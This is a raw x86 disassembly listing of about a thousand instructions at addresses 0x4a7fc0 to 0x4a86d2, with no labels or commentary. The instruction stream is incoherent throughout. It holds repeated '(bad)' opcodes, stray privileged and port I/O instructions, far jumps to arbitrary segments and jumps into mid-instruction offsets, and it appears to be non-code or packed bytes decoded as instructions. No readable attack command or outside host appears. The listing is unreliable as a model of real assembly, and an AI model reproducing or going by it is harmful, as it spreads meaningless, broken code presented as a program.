  4a7fc0:	dec    ebp
  4a7fc1:	mov    ds:0xa74c9ee9,ax
  4a7fc7:	push   eax
  4a7fc8:	or     BYTE PTR [ebp+edx*1+0x574651f],dh
  4a7fcf:	jo     0x4a7f91
  4a7fd1:	jbe    0x4a8048
  4a7fd3:	inc    edx
  4a7fd4:	das    
  4a7fd5:	inc    ecx
  4a7fd6:	dec    esi
  4a7fd7:	or     DWORD PTR cs:[ecx*4+0x246ced28],ecx
  4a7fdf:	std    
  4a7fe0:	sbb    bh,BYTE PTR [ebx]
  4a7fe2:	dec    ebp
  4a7fe3:	and    BYTE PTR [eax+0x62],dh
  4a7fe6:	sbb    DWORD PTR [ebx+0x256cf4bd],eax
  4a7fec:	retf   0x869d
  4a7fef:	scas   eax,DWORD PTR es:[edi]
  4a7ff0:	cmp    al,0xba
  4a7ff2:	mov    edx,ecx
  4a7ff4:	or     DWORD PTR [eax-0x6a],edi
  4a7ff7:	jecxz  0x4a7f84
  4a7ff9:	sub    eax,DWORD PTR [edx+0x3802a88b]
  4a7fff:	xchg   edi,eax
  4a8000:	div    BYTE PTR fs:[ebx+0x37]
  4a8004:	mov    DWORD PTR [eax-0x6af838f3],ebx
  4a800a:	sbb    DWORD PTR [ebx-0xd],esi
  4a800d:	ins    BYTE PTR es:[edi],dx
  4a800e:	shl    al,0x87
  4a8011:	xchg   ebp,eax
  4a8012:	xor    BYTE PTR [ebp+0x2f],dh
  4a8015:	loopne 0x4a8019
  4a8017:	je     0x4a8042
  4a8019:	rol    BYTE PTR [ebp-0x23674ee5],1
  4a801f:	ror    BYTE PTR [ecx+0x7d5b05fa],1
  4a8025:	jmp    0xec620212
  4a802a:	enter  0x652d,0xb2
  4a802e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a802f:	push   cs
  4a8030:	push   ss
  4a8031:	adc    BYTE PTR [edi-0x3e],dl
  4a8034:	je     0x4a7fd4
  4a8036:	fistp  QWORD PTR [esp+ebx*2]
  4a8039:	add    al,0x74
  4a803b:	sub    dl,BYTE PTR [esi]
  4a803d:	add    esp,ecx
  4a803f:	mov    bh,0x91
  4a8041:	add    DWORD PTR [ebx],ebp
  4a8043:	lea    edx,[ebp+0x10945f20]
  4a8049:	mov    dh,0x2
  4a804b:	jle    0x4a8068
  4a804d:	sbb    DWORD PTR [ebp+0x25182d38],edx
  4a8053:	les    ecx,FWORD PTR [eax-0x44]
  4a8056:	mov    dh,0xe
  4a8058:	xchg   esp,eax
  4a8059:	sbb    BYTE PTR [ecx+0x5a],bl
  4a805c:	push   ebp
  4a805d:	in     al,dx
  4a805e:	rcr    BYTE PTR [edx],0x14
  4a8061:	pop    esp
  4a8062:	scas   al,BYTE PTR es:[edi]
  4a8063:	adc    eax,0x54188f38
  4a8068:	sub    BYTE PTR [ecx],bl
  4a806a:	ja     0x4a801e
  4a806c:	sub    ecx,edi
  4a806e:	dec    ecx
  4a806f:	inc    cx
  4a8071:	dec    esp
  4a8072:	sub    BYTE PTR ds:0xabf36e2b,al
  4a8078:	xor    al,0x34
  4a807a:	fadd   QWORD PTR [esi-0x40]
  4a807d:	xchg   edi,eax
  4a807e:	jns    0x4a80ac
  4a8080:	xchg   BYTE PTR [eax-0x3dbc0475],ch
  4a8086:	xchg   ecx,eax
  4a8087:	dec    eax
  4a8088:	sub    ecx,DWORD PTR [ebx-0x3f]
  4a808b:	dec    eax
  4a808c:	sbb    BYTE PTR [esi-0x40],al
  4a808f:	jmp    0x3881:0x4dc7d254
  4a8096:	call   0x8b9b2937
  4a809b:	mov    cl,0x25
  4a809d:	mov    esp,0x5cb15990
  4a80a2:	shl    BYTE PTR [edi+0x2c733a50],1
  4a80a8:	in     al,0xeb
  4a80aa:	cmp    al,0xad
  4a80ac:	add    dl,BYTE PTR [edx]
  4a80ae:	ret    
  4a80af:	jae    0x4a8069
  4a80b1:	pop    edx
  4a80b2:	out    dx,eax
  4a80b3:	pop    edi
  4a80b4:	or     bl,cl
  4a80b6:	cdq    
  4a80b7:	in     al,0x64
  4a80b9:	pop    ecx
  4a80ba:	dec    eax
  4a80bb:	stc    
  4a80bc:	ja     0x4a80e0
  4a80be:	mov    cl,BYTE PTR [edi]
  4a80c0:	jmp    0x3aee62cd
  4a80c5:	stos   DWORD PTR es:[edi],eax
  4a80c6:	jne    0x4a80e0
  4a80c8:	add    eax,0x1c2e1290
  4a80cd:	mov    ebp,0x3a01478a
  4a80d2:	mov    DWORD PTR [esi+edi*4-0x27],0xfa67dd84
  4a80da:	jae    0x4a80eb
  4a80dc:	dec    esp
  4a80dd:	pop    ebx
  4a80de:	inc    edi
  4a80df:	cmp    edi,edx
  4a80e1:	push   esi
  4a80e2:	add    edx,DWORD PTR [edx+0x78]
  4a80e5:	test   al,0x56
  4a80e7:	popa   
  4a80e8:	or     eax,0xebc16086
  4a80ed:	pusha  
  4a80ee:	xor    dh,BYTE PTR [ebx+0x5c]
  4a80f1:	sub    esp,DWORD PTR [esi]
  4a80f3:	arpl   WORD PTR [ebp+0x700606e4],cx
  4a80f9:	pop    ss
  4a80fa:	loope  0x4a8123
  4a80fc:	push   edx
  4a80fd:	push   eax
  4a80fe:	push   ecx
  4a80ff:	jo     0x4a814b
  4a8101:	(bad)  
  4a8102:	mov    ebp,0xf2403275
  4a8107:	mov    esp,0x5d3a5b75
  4a810c:	inc    edx
  4a810d:	rcr    DWORD PTR [edx-0x6a75e589],1
  4a8113:	sti    
  4a8114:	adc    dl,al
  4a8116:	sbb    eax,DWORD PTR [ebx]
  4a8118:	cmp    BYTE PTR [edi],dl
  4a811a:	jne    0x4a812c
  4a811c:	pushf  
  4a811d:	adc    BYTE PTR [edx+0x5422f98d],cl
  4a8123:	jno    0x4a80db
  4a8125:	cmp    BYTE PTR [edi+0x14],cl
  4a8128:	fdivr  DWORD PTR [edx-0x5c]
  4a812b:	popa   
  4a812c:	inc    ebp
  4a812d:	or     DWORD PTR [eax+edi*8],eax
  4a8130:	xchg   al,ah
  4a8132:	xchg   esi,eax
  4a8133:	test   DWORD PTR [edx],eax
  4a8135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a8136:	mov    al,ds:0x23b9aea9
  4a813b:	inc    ebx
  4a813c:	js     0x4a80f8
  4a813e:	scas   eax,DWORD PTR es:[edi]
  4a813f:	or     dl,BYTE PTR [edi-0x60]
  4a8142:	or     BYTE PTR [ebx-0x3e],cl
  4a8145:	lock je 0x4a8173
  4a8148:	cmp    ebx,edx
  4a814a:	cmp    BYTE PTR [ecx+esi*2],bl
  4a814d:	or     al,bl
  4a814f:	inc    ebx
  4a8150:	gs or  ebx,eax
  4a8153:	jge    0x4a8161
  4a8155:	cmp    DWORD PTR [edi],eax
  4a8157:	fstp   TBYTE PTR [ebx]
  4a8159:	xor    bl,BYTE PTR [eax-0x75]
  4a815c:	xor    BYTE PTR [ebx+0x42],al
  4a815f:	jb     0x4a8147
  4a8161:	cld    
  4a8162:	pop    esi
  4a8163:	dec    ebp
  4a8164:	test   DWORD PTR [ecx-0x46],esi
  4a8167:	aaa    
  4a8168:	push   ebp
  4a8169:	jns    0x4a818c
  4a816b:	or     ecx,DWORD PTR [eax-0x3b]
  4a816e:	jb     0x4a8142
  4a8170:	dec    ebx
  4a8171:	lock adc bl,BYTE PTR gs:[eax+eax*1]
  4a8176:	dec    ebx
  4a8177:	mov    bh,0xc6
  4a8179:	dec    esi
  4a817a:	adc    eax,0xa94d03a4
  4a817f:	push   esp
  4a8180:	lods   al,BYTE PTR ds:[esi]
  4a8181:	js     0x4a816d
  4a8183:	xchg   BYTE PTR [eax+0x2f],al
  4a8186:	and    al,0x9f
  4a8188:	fidiv  DWORD PTR [ebx-0x1f]
  4a818b:	dec    edi
  4a818c:	mov    dl,0x7
  4a818e:	add    DWORD PTR [ecx],esi
  4a8190:	cmp    ebx,DWORD PTR [ebp-0x5c]
  4a8193:	jbe    0x4a81fc
  4a8195:	xchg   edx,eax
  4a8196:	pusha  
  4a8197:	or     edx,ecx
  4a8199:	or     edx,ecx
  4a819b:	push   edx
  4a819c:	sub    BYTE PTR [edi],ch
  4a819e:	test   DWORD PTR [ebx],ecx
  4a81a0:	das    
  4a81a1:	inc    ebx
  4a81a2:	dec    edi
  4a81a3:	nop
  4a81a4:	inc    ebp
  4a81a5:	sbb    BYTE PTR [esi+0x3515d3a2],bl
  4a81ab:	iret   
  4a81ac:	sub    DWORD PTR [ebx],edi
  4a81ae:	adc    eax,DWORD PTR [ebx]
  4a81b0:	inc    ebp
  4a81b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a81b2:	push   esi
  4a81b3:	jl     0x4a81a2
  4a81b5:	ss ret 0x8a2e
  4a81b9:	sbb    esi,ebx
  4a81bb:	sub    edi,DWORD PTR [ebp-0x139e561e]
  4a81c1:	sub    DWORD PTR [eax],edi
  4a81c3:	pop    es
  4a81c4:	sahf   
  4a81c5:	adc    ebp,DWORD PTR [edi+0x62]
  4a81c8:	or     al,0xe7
  4a81ca:	sub    al,0xa1
  4a81cc:	sub    eax,0x7420ad33
  4a81d1:	fld    QWORD PTR [ebx-0x5]
  4a81d4:	mov    DWORD PTR [edi],ebp
  4a81d6:	add    esp,ebp
  4a81d8:	pop    es
  4a81d9:	push   ebp
  4a81da:	sub    ch,ah
  4a81dc:	push   es
  4a81dd:	jns    0x4a81d2
  4a81df:	jmp    0x4a825b
  4a81e1:	or     ch,BYTE PTR [esi]
  4a81e3:	imul   esi,DWORD PTR [eax+0x6b],0x2a
  4a81e7:	inc    ebx
  4a81e8:	mov    al,0x12
  4a81ea:	jae    0x4a8258
  4a81ec:	xor    eax,0xe2a4592b
  4a81f1:	and    cl,BYTE PTR [eax]
  4a81f3:	(bad)  
  4a81f4:	or     bh,BYTE PTR [ecx]
  4a81f6:	popa   
  4a81f7:	xor    DWORD PTR [esi+0x757499e0],esp
  4a81fd:	cmp    dl,BYTE PTR [eax+0x35]
  4a8200:	loop   0x4a81a6
  4a8202:	cwde   
  4a8203:	jl     0x4a8215
  4a8205:	fdiv   DWORD PTR [edx+0x26]
  4a8208:	jmp    0xbbfb:0x14750f29
  4a820f:	jae    0x4a81ca
  4a8211:	dec    esi
  4a8212:	test   DWORD PTR [edi-0x9],eax
  4a8215:	xchg   esp,eax
  4a8216:	cmp    BYTE PTR [ebx-0x1],0xd
  4a821a:	jne    0x4a823d
  4a821c:	shl    DWORD PTR [eax-0x78],0x25
  4a8220:	and    DWORD PTR [ebx+0x2d2f0d11],ecx
  4a8226:	loop   0x4a8232
  4a8228:	or     eax,0xdf4308c4
  4a822d:	or     esp,DWORD PTR ds:0x18248294
  4a8233:	shr    BYTE PTR [ebp+ebx*1-0x28aff290],1
  4a823a:	add    BYTE PTR [esi],ah
  4a823c:	lods   al,BYTE PTR ds:[esi]
  4a823d:	mov    al,ds:0xfd7c5a14
  4a8242:	sahf   
  4a8243:	ins    DWORD PTR es:[edi],dx
  4a8244:	loope  0x4a8275
  4a8246:	mov    dl,0x72
  4a8248:	mov    ecx,edx
  4a824a:	sub    ecx,ebx
  4a824c:	cmp    ecx,0x821f7dda
  4a8252:	fwait
  4a8253:	push   es
  4a8254:	push   esi
  4a8255:	mov    eax,0x6e8579d
  4a825a:	mov    al,ds:0xf68572c0
  4a825f:	jbe    0x4a81f0
  4a8261:	mov    ah,0xa0
  4a8263:	mov    ah,0x54
  4a8265:	mov    BYTE PTR [eax+edx*2],ah
  4a8268:	jae    0x4a82d7
  4a826a:	sub    edi,edi
  4a826c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a826d:	adc    al,0xee
  4a826f:	or     BYTE PTR [eax+0x3b],al
  4a8272:	iret   
  4a8273:	je     0x4a82a9
  4a8275:	cmp    ecx,DWORD PTR [ebp+0x72262c74]
  4a827b:	in     al,dx
  4a827c:	ja     0x4a8270
  4a827e:	sahf   
  4a827f:	adc    al,0xe2
  4a8281:	clc    
  4a8282:	pusha  
  4a8283:	aaa    
  4a8284:	inc    esi
  4a8285:	lock adc BYTE PTR [esi],dh
  4a8288:	adc    eax,0xf4901bef
  4a828d:	dec    eax
  4a828e:	cmp    bl,dl
  4a8290:	mov    DWORD PTR [ebx-0x456aeb9e],ebp
  4a8296:	xchg   esi,eax
  4a8297:	jbe    0x4a82a4
  4a8299:	dec    ebp
  4a829a:	mov    al,ds:0x6f3ca88b
  4a829f:	push   eax
  4a82a0:	iret   
  4a82a1:	cmp    dh,al
  4a82a3:	push   ebx
  4a82a4:	sbb    al,0xb8
  4a82a6:	mov    bh,0x32
  4a82a8:	sub    DWORD PTR [esi+ecx*1+0xaa07b27],0x7d53452f
  4a82b3:	mov    gs,WORD PTR [eax]
  4a82b5:	mov    ah,0x2e
  4a82b7:	or     BYTE PTR [eax+0x203d987c],ah
  4a82bd:	or     ecx,edx
  4a82bf:	push   cs
  4a82c0:	xchg   edx,eax
  4a82c1:	and    al,0xb4
  4a82c3:	dec    esp
  4a82c4:	fsub   DWORD PTR [ecx+0x78]
  4a82c7:	sbb    al,0x3a
  4a82c9:	xor    eax,0x93e68830
  4a82ce:	mov    ah,0x48
  4a82d0:	xor    al,0x86
  4a82d2:	mov    al,0x6c
  4a82d4:	xchg   esi,esi
  4a82d6:	xor    ebp,DWORD PTR [eax+0x24]
  4a82d9:	mov    ch,0xb9
  4a82db:	lea    eax,[ebx+0x71]
  4a82de:	jge    0x4a828c
  4a82e0:	sub    al,0x23
  4a82e2:	das    
  4a82e3:	and    eax,0x8d97f61a
  4a82e8:	jnp    0x4a833e
  4a82ea:	sbb    bh,BYTE PTR [edx-0x5a5fade4]
  4a82f0:	test   DWORD PTR [ebx],edx
  4a82f2:	xchg   ecx,eax
  4a82f3:	pop    ss
  4a82f4:	pop    ebx
  4a82f5:	inc    ecx
  4a82f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a82f7:	pop    ebp
  4a82f8:	(bad)  
  4a82f9:	sti    
  4a82fa:	icebp  
  4a82fb:	daa    
  4a82fc:	test   eax,0x454e9e73
  4a8301:	js     0x4a8377
  4a8303:	pop    edx
  4a8304:	xchg   BYTE PTR ds:0x814ff492,ch
  4a830a:	jmp    0x53d5:0x52de3e98
  4a8311:	std    
  4a8312:	scas   al,BYTE PTR es:[edi]
  4a8313:	jp     0x4a82b2
  4a8315:	popf   
  4a8316:	xchg   edx,eax
  4a8317:	outs   dx,DWORD PTR ds:[esi]
  4a8318:	jmp    0x4a8343
  4a831a:	push   esp
  4a831b:	in     eax,dx
  4a831c:	rcr    BYTE PTR [esi+0x22293e9e],1
  4a8322:	in     al,0x13
  4a8324:	cmp    ch,cl
  4a8326:	in     al,0xf8
  4a8328:	pop    edi
  4a8329:	fisubr DWORD PTR [ebx+0x438a6c6e]
  4a832f:	in     eax,0x74
  4a8331:	popa   
  4a8332:	fidiv  WORD PTR [eax]
  4a8334:	fbstp  TBYTE PTR [ebp+0x56]
  4a8337:	and    ah,dl
  4a8339:	inc    esp
  4a833a:	add    dh,BYTE PTR [edi+esi*2+0x2a]
  4a833e:	(bad)  
  4a833f:	cs or  al,0xaa
  4a8342:	stos   BYTE PTR es:[edi],al
  4a8343:	sub    DWORD PTR [ebx+esi*2],edx
  4a8346:	and    al,0x80
  4a8348:	aas    
  4a8349:	mov    WORD PTR [edi],ds
  4a834b:	sub    esp,DWORD PTR [ecx]
  4a834d:	and    BYTE PTR [ebx],al
  4a834f:	or     al,0x70
  4a8351:	push   ecx
  4a8352:	jge    0x4a8378
  4a8354:	mov    ch,0x42
  4a8356:	adc    DWORD PTR [eax-0x4fc6f7ee],edi
  4a835c:	ror    BYTE PTR [ecx],0xf8
  4a835f:	mov    bl,0x75
  4a8361:	add    ebx,esp
  4a8363:	dec    edi
  4a8364:	push   esp
  4a8365:	inc    ecx
  4a8366:	cmp    al,0x69
  4a8368:	ret    0x5bd8
  4a836b:	sub    eax,0x74071250
  4a8370:	stc    
  4a8371:	sub    BYTE PTR [edx+0x67],0x60
  4a8375:	inc    edx
  4a8376:	mov    ah,0x63
  4a8378:	or     eax,DWORD PTR [edi+0x5a10846c]
  4a837e:	dec    eax
  4a837f:	(bad)  
  4a8380:	dec    eax
  4a8381:	and    dl,ah
  4a8383:	popf   
  4a8384:	fisttp WORD PTR [eax+ebp*2+0x12]
  4a8388:	icebp  
  4a8389:	push   cs
  4a838a:	cmp    esi,0xfffffff4
  4a838d:	dec    esi
  4a838e:	mov    BYTE PTR [edi],0x23
  4a8391:	or     DWORD PTR [ebx],ebp
  4a8393:	jno    0x4a83b9
  4a8395:	ins    BYTE PTR es:[edi],dx
  4a8396:	add    DWORD PTR [esi+0x46],edi
  4a8399:	mov    al,0x6b
  4a839b:	xor    DWORD PTR [esi],ebx
  4a839d:	data16 cmp al,0x2b
  4a83a0:	stc    
  4a83a1:	ins    BYTE PTR es:[edi],dx
  4a83a2:	mov    DWORD PTR [eax],edi
  4a83a4:	add    esi,DWORD PTR [ecx+0xb40a705]
  4a83aa:	enter  0xb6e3,0x6e
  4a83ae:	or     cl,BYTE PTR [edi]
  4a83b0:	(bad)  
  4a83b1:	and    BYTE PTR [ebp+eax*2+0x7c],dh
  4a83b5:	jae    0x4a835a
  4a83b7:	cs mov ah,0x7c
  4a83ba:	sbb    al,0xc3
  4a83bc:	jbe    0x4a83da
  4a83be:	lea    edx,[esi*4+0x4c0a92f8]
  4a83c5:	cmp    DWORD PTR [edi-0x14],eax
  4a83c8:	push   eax
  4a83c9:	aas    
  4a83ca:	dec    esp
  4a83cb:	mov    dh,0xcc
  4a83cd:	mov    BYTE PTR [ecx],0x39
  4a83d0:	jne    0x4a838e
  4a83d2:	jle    0x4a83de
  4a83d4:	inc    ecx
  4a83d5:	or     esp,ecx
  4a83d7:	add    ebp,ebp
  4a83d9:	rcl    DWORD PTR [ebp+0x31d2c223],1
  4a83df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a83e0:	push   edx
  4a83e1:	shl    BYTE PTR [eax+eiz*4+0x19],1
  4a83e5:	pop    eax
  4a83e6:	add    BYTE PTR [edx-0x77ab4328],0xb8
  4a83ed:	jns    0x4a83b0
  4a83ef:	mov    dl,0x2
  4a83f1:	jge    0x4a83fc
  4a83f3:	cmp    eax,0xda117b5e
  4a83f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a83f9:	fisubr WORD PTR [esi+edi*4+0x3289f12b]
  4a8400:	adc    dh,BYTE PTR [eax+0x116e720c]
  4a8406:	scas   eax,DWORD PTR es:[edi]
  4a8407:	adc    BYTE PTR [ebx+0x5839e8b8],0x28
  4a840e:	or     al,0x99
  4a8410:	inc    BYTE PTR [eax]
  4a8412:	sub    esi,DWORD PTR [eax+0x53]
  4a8415:	xchg   ebx,eax
  4a8416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a8417:	in     eax,dx
  4a8418:	or     al,0x47
  4a841a:	outs   dx,DWORD PTR ds:[esi]
  4a841b:	push   es
  4a841c:	inc    eax
  4a841d:	inc    edi
  4a841e:	lahf   
  4a841f:	aam    0x43
  4a8421:	es loope 0x4a8430
  4a8424:	sub    al,0x13
  4a8426:	scas   al,BYTE PTR es:[edi]
  4a8427:	icebp  
  4a8428:	or     dl,BYTE PTR [eax-0x46]
  4a842b:	inc    ebp
  4a842c:	or     BYTE PTR [edx+0x1f],dh
  4a842f:	aas    
  4a8430:	jmp    0x27803467
  4a8435:	push   ecx
  4a8436:	push   eax
  4a8437:	and    eax,0x80347548
  4a843c:	push   cs
  4a843d:	psubusw mm5,QWORD PTR ds:0x37a8b483
  4a8444:	mov    al,0x0
  4a8446:	pop    edx
  4a8447:	push   0xc918832a
  4a844c:	xchg   esi,eax
  4a844d:	ja     0x4a8406
  4a844f:	mov    bl,0xdb
  4a8451:	cmp    DWORD PTR ds:0xf03d39be,esi
  4a8458:	invd   
  4a845a:	cmp    DWORD PTR ds:0x9f006de0,ebx
  4a8460:	clc    
  4a8461:	je     0x4a84e1
  4a8463:	scas   al,BYTE PTR es:[edi]
  4a8464:	fild   DWORD PTR [eax]
  4a8466:	scas   al,BYTE PTR es:[edi]
  4a8467:	add    cl,dh
  4a8469:	jge    0x4a840a
  4a846b:	adc    cl,BYTE PTR [ebx-0x76a8a55d]
  4a8471:	jae    0x4a83fc
  4a8473:	xchg   BYTE PTR [edx+0x61],ah
  4a8476:	loopne 0x4a84d7
  4a8478:	test   BYTE PTR [esi-0x77283b78],0x7c
  4a847f:	or     al,BYTE PTR [esi]
  4a8481:	push   esp
  4a8482:	leave  
  4a8483:	dec    ebx
  4a8484:	pop    edi
  4a8485:	dec    edi
  4a8486:	push   eax
  4a8487:	push   eax
  4a8488:	adc    eax,0xdc00d4dc
  4a848d:	addr16 ret 
  4a848f:	mov    ds:0xce87a356,al
  4a8494:	add    BYTE PTR [ecx],al
  4a8496:	dec    edi
  4a8497:	rol    DWORD PTR [ebx],cl
  4a8499:	mov    ds:0x802c9e8,eax
  4a849e:	call   0x1d46988e
  4a84a3:	and    DWORD PTR [eax],esp
  4a84a5:	(bad)  
  4a84a6:	mov    ecx,0x4a5afa8c
  4a84ab:	sar    DWORD PTR [edx],0x97
  4a84ae:	mov    al,0x12
  4a84b0:	adc    eax,0x3c041999
  4a84b5:	fucomp st(2)
  4a84b7:	test   BYTE PTR [ebx-0x42],bh
  4a84ba:	xchg   BYTE PTR [esi+0x5a],dh
  4a84bd:	sbb    edi,DWORD PTR ds:0x6b0b0114
  4a84c3:	pusha  
  4a84c4:	sub    BYTE PTR [ebp-0x25658ea0],0x17
  4a84cb:	push   esi
  4a84cc:	push   DWORD PTR [ebp+0x61]
  4a84cf:	xchg   edi,eax
  4a84d0:	push   cs
  4a84d1:	push   edi
  4a84d2:	mov    esi,0xb73cedfe
  4a84d7:	jmp    0x4a854c
  4a84d9:	add    al,0xc4
  4a84db:	push   ss
  4a84dc:	dec    ebx
  4a84dd:	add    edx,DWORD PTR [ecx+0x50]
  4a84e0:	xor    cl,BYTE PTR [ebp-0xd80d9f5]
  4a84e6:	push   edi
  4a84e7:	(bad)  
  4a84e8:	push   edx
  4a84e9:	push   ebx
  4a84ea:	add    edi,0x3
  4a84ed:	push   edi
  4a84ee:	push   ebx
  4a84ef:	cmp    eax,DWORD PTR [ebx-0x67f3fdfe]
  4a84f5:	das    
  4a84f6:	fst    QWORD PTR [ecx-0x230586ea]
  4a84fc:	not    BYTE PTR [eax]
  4a84fe:	sbb    al,0x2
  4a8500:	out    dx,eax
  4a8501:	je     0x4a84fd
  4a8503:	adc    BYTE PTR [edx+0x2e64cbc],0x79
  4a850a:	and    al,0x62
  4a850c:	pop    ebx
  4a850d:	xchg   ebx,eax
  4a850e:	dec    esp
  4a850f:	mov    ecx,0xe4373006
  4a8514:	inc    edi
  4a8515:	clc    
  4a8516:	mov    edi,0x9695859a
  4a851b:	scas   eax,DWORD PTR es:[edi]
  4a851c:	stc    
  4a851d:	sub    al,0x48
  4a851f:	enter  0xbbe3,0x53
  4a8523:	fs js  0x4a8550
  4a8526:	xchg   edi,eax
  4a8527:	and    ch,dh
  4a8529:	inc    esp
  4a852a:	sbb    al,BYTE PTR [esi]
  4a852c:	sbb    eax,0xf442efd3
  4a8531:	mov    dl,0xc3
  4a8533:	jge    0x4a8569
  4a8535:	(bad)  
  4a8536:	push   ss
  4a8537:	jo     0x4a8551
  4a8539:	outs   dx,BYTE PTR ds:[esi]
  4a853a:	shr    DWORD PTR [esi],0xd3
  4a853d:	call   0x2739:0x53f85068
  4a8544:	xor    BYTE PTR [edx],bh
  4a8546:	adc    edx,eax
  4a8548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a8549:	mov    ss,WORD PTR [ebp-0x650fbe50]
  4a854f:	jmp    0x22ce:0xc814c7b4
  4a8556:	jle    0x4a8588
  4a8558:	je     0x4a8526
  4a855a:	cld    
  4a855b:	mov    edi,DWORD PTR [eax]
  4a855d:	lods   al,BYTE PTR ds:[esi]
  4a855e:	ins    DWORD PTR es:[edi],dx
  4a855f:	or     bl,BYTE PTR [edi-0x3f7bd980]
  4a8565:	stos   BYTE PTR es:[edi],al
  4a8566:	and    eax,edx
  4a8568:	push   0xffffffaf
  4a856a:	call   0x181b:0x14ff8c0
  4a8571:	daa    
  4a8572:	jbe    0x4a8575
  4a8574:	add    BYTE PTR [ebx-0x771aa22d],al
  4a857a:	mov    ebx,0xd90c9775
  4a857f:	pusha  
  4a8580:	sbb    BYTE PTR [edx],ch
  4a8582:	hlt    
  4a8583:	fisubr DWORD PTR [ebx+0x4c659a01]
  4a8589:	mov    ch,ah
  4a858b:	cvtps2pd xmm7,QWORD PTR [ecx]
  4a858e:	adc    BYTE PTR [ebp-0x627557dc],0x86
  4a8595:	xchg   bl,bl
  4a8597:	dec    edx
  4a8598:	ret    
  4a8599:	in     eax,dx
  4a859a:	and    eax,0xcf66b8b9
  4a859f:	ficom  DWORD PTR [ebx+edx*8-0xbe8fe56]
  4a85a6:	pop    es
  4a85a7:	sysret 
  4a85a9:	scas   eax,DWORD PTR es:[edi]
  4a85aa:	imul   esi,esp,0x3d45524a
  4a85b0:	or     DWORD PTR [eax+0x74857b84],edi
  4a85b6:	push   cs
  4a85b7:	test   BYTE PTR [ecx+0x8e32736],dh
  4a85bd:	add    al,0xfc
  4a85bf:	xchg   ecx,eax
  4a85c0:	cmp    al,0x97
  4a85c2:	or     al,0x9e
  4a85c4:	push   ecx
  4a85c5:	lods   eax,DWORD PTR ds:[esi]
  4a85c6:	jbe    0x4a8629
  4a85c8:	and    BYTE PTR [eax-0x5],dh
  4a85cb:	and    bl,cl
  4a85cd:	push   ebp
  4a85ce:	ret    0x302
  4a85d1:	retf   
  4a85d2:	mov    ecx,DWORD PTR [ecx-0x7ed9e11c]
  4a85d8:	push   0xffffff81
  4a85da:	inc    esi
  4a85db:	shr    BYTE PTR [edx-0x6d],0x51
  4a85df:	jecxz  0x4a8636
  4a85e1:	mov    bl,0x8
  4a85e3:	inc    ebx
  4a85e4:	add    DWORD PTR [ecx-0x5d18f870],ebp
  4a85ea:	arpl   WORD PTR [ebx],ax
  4a85ec:	xlat   BYTE PTR ds:[ebx]
  4a85ed:	adc    BYTE PTR [edi+0x3a],dl
  4a85f0:	adc    al,0x15
  4a85f2:	xchg   DWORD PTR [ecx+0x79a41b38],esp
  4a85f8:	dec    ebp
  4a85f9:	dec    ebp
  4a85fa:	(bad)  
  4a85fb:	out    dx,al
  4a85fc:	or     al,0x6a
  4a85fe:	fild   DWORD PTR [ecx-0x42]
  4a8601:	mov    edx,0xe45dd904
  4a8606:	fild   DWORD PTR [eax+0x3]
  4a8609:	push   0xc
  4a860b:	adc    bl,al
  4a860d:	ret    0x56dd
  4a8610:	add    dl,0xc1
  4a8613:	adc    BYTE PTR [edx-0x26b776fc],ch
  4a8619:	inc    ebp
  4a861a:	in     al,0x66
  4a861c:	dec    esi
  4a861d:	push   eax
  4a861e:	cmp    BYTE PTR [esp+edx*1],al
  4a8621:	xchg   ebp,eax
  4a8622:	int3   
  4a8623:	loopne 0x4a85e1
  4a8625:	repz sub eax,0x1e508794
  4a862b:	call   0x331f81b0
  4a8630:	jmp    0x13bf:0x1de42be4
  4a8637:	add    BYTE PTR [esi+0x3548dca],bh
  4a863d:	popw   es
  4a863f:	add    DWORD PTR [edx+0x2b],edx
  4a8642:	fcom   DWORD PTR [ecx+0x58]
  4a8645:	add    BYTE PTR [edx-0x21],al
  4a8648:	sub    edi,eax
  4a864a:	aaa    
  4a864b:	and    bl,al
  4a864d:	inc    esi
  4a864e:	rcl    DWORD PTR [esp+edi*1],0x50
  4a8652:	outs   dx,BYTE PTR ds:[esi]
  4a8653:	sete   BYTE PTR [ebp+0x28]
  4a8657:	adc    BYTE PTR [eax+0x9],bh
  4a865a:	or     ebx,DWORD PTR [edx+0x42]
  4a865d:	or     al,0x9f
  4a865f:	mov    dh,0x1e
  4a8661:	or     BYTE PTR cs:[esi],dl
  4a8664:	jb     0x4a8660
  4a8666:	xchg   ecx,eax
  4a8667:	ret    0x100
  4a866a:	jl     0x4a8667
  4a866c:	push   esp
  4a866d:	add    BYTE PTR [esi],0x86
  4a8670:	pop    ebp
  4a8671:	push   ebx
  4a8672:	aad    0x9d
  4a8674:	add    ebp,edx
  4a8676:	rol    ecx,0x78
  4a8679:	or     BYTE PTR [esi],bh
  4a867b:	iret   
  4a867c:	stos   DWORD PTR es:[edi],eax
  4a867d:	push   eax
  4a867e:	push   ds
  4a867f:	fs inc esp
  4a8681:	push   es
  4a8682:	test   edi,ecx
  4a8684:	ss jne 0x4a8702
  4a8687:	dec    edi
  4a8688:	repz imul esp,DWORD PTR [edi],0x50f973e8
  4a868f:	push   ss
  4a8690:	add    BYTE PTR [esp+edx*1+0x87ff685],bh
  4a8697:	add    cl,BYTE PTR [eax]
  4a8699:	add    ecx,DWORD PTR [eax]
  4a869b:	add    al,0x8
  4a869d:	add    eax,0x80608
  4a86a2:	pop    es
  4a86a3:	sub    BYTE PTR [eax],bh
  4a86a5:	popa   
  4a86a6:	sub    eax,0x14380ad1
  4a86ab:	test   BYTE PTR [edi],dl
  4a86ad:	shl    BYTE PTR [esi-0x10],1
  4a86b0:	xor    DWORD PTR [edx+esi*4+0x3cecb431],0xffffffa6
  4a86b8:	in     al,0x64
  4a86ba:	jmp    0x767f:0x51895756
  4a86c1:	jl     0x4a8657
  4a86c3:	dec    eax
  4a86c4:	or     al,0xa6
  4a86c6:	in     eax,dx
  4a86c7:	add    BYTE PTR [eax+0x10],bh
  4a86ca:	lea    esi,[eax-0x8]
  4a86cd:	enter  0xfa9,0xb2
  4a86d1:	pop    ss
  4a86d2:	mov    esp,0x88c8af6
